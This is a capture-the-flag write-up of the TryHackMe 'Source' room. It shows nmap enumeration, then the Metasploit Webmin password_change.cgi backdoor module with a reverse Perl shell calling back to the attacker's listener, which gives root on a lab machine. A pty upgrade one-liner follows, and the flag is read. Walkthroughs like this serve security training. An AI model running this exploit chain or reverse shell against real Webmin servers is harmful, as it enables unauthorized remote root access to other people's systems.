# [Source](https://tryhackme.com/room/source)

> Darshan Patel

## Overview

| Tables | Description |
| ------ | ----------- |
| Challenge Name | Source |
| Difficulty | Easy |
| Tags | CVE, easy, realistic, ctf|

---
```bash
$ export IP=10.10.38.224
```

### Enumeration

```bash
$ nmap -sC -sV -v $IP -oN nmap/initial.nmap
```

```
Nmap scan results:

Host is up (0.20s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/10%OT=22%CT=1%CU=34627%PV=Y%DS=2%DC=T%G=Y%TM=5F815B
OS:12%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)SE
OS:Q(SP=105%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A)SEQ(TI=Z%CI=Z%II=I%TS=D)OPS(O1=M50
OS:5ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6
OS:=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF
OS:=Y%T=40%W=F507%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%
OS:Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y
OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%R
OS:D=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IP
OS:L=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Warning: 10.10.17.54 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.17.54
Host is up (0.15s latency).
Not shown: 65530 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
10000/tcp open     snet-sensor-mgmt
13559/tcp filtered unknown
23931/tcp filtered unknown
32123/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 704.60 seconds
```


```
nmap -sV -T4 10.10.17.54 -p 10000
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-10 12:40 IST
Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 93.02% done; ETC: 12:40 (0:00:00 remaining)
Nmap scan report for 10.10.17.54
Host is up (0.16s latency).

PORT      STATE SERVICE VERSION
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.00 seconds
```

I think the webmin httpd has a vulnerable version out there on the internet.
Lets search for one of that.

```msf6
msf6 > search webmin

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_backdoor           2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   3  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   4  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE


Interact with a module by name or index. For example info 5, use 5 or use exploit/unix/webapp/webmin_upload_exec

msf6 > exploit/linux/http/webmin_backdoor
```

This is vulnerable.
For more info you can visit this website.

`https://www.exploit-db.com/exploits/47230`

```
msf6 exploit(linux/http/webmin_backdoor) > options

Module options (exploit/linux/http/webmin_backdoor):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      10000            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path to Webmin
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)


msf6 exploit(linux/http/webmin_backdoor) > 
msf6 exploit(linux/http/webmin_backdoor) > set rhosts 10.10.17.54
rhosts => 10.10.17.54
msf6 exploit(linux/http/webmin_backdoor) > set lhost tun0
lhost => 10.9.81.62
msf6 exploit(linux/http/webmin_backdoor) > set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf6 exploit(linux/http/webmin_backdoor) > run

[*] Started reverse TCP handler on 10.9.81.62:4444 
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.9.81.62:4444 -> 10.10.17.54:45824) at 2020-10-10 12:47:10 +0530

id
uid=0(root) gid=0(root) groups=0(root)

Wow we got shell as root user thats interesting.
To get a stable shell we can do that by using python2 or python3

python3 -c "import pty;pty.spawn('/bin/bash')"
root@source:/usr/share/webmin/# 
```

This was easy to exploit we didnt even tried privilege escalation.
```
root@source:/home# cd dark
cd dark
root@source:/home/dark# ls
ls
user.txt  webmin_1.890_all.deb
root@source:/home/dark# cat user.txt
cat user.txt
THM{SUPPLY_CHAIN_COMPROMISE}
root@source:/home/dark# 
```

And we are done.


Thank you.... Happy Hacking :)
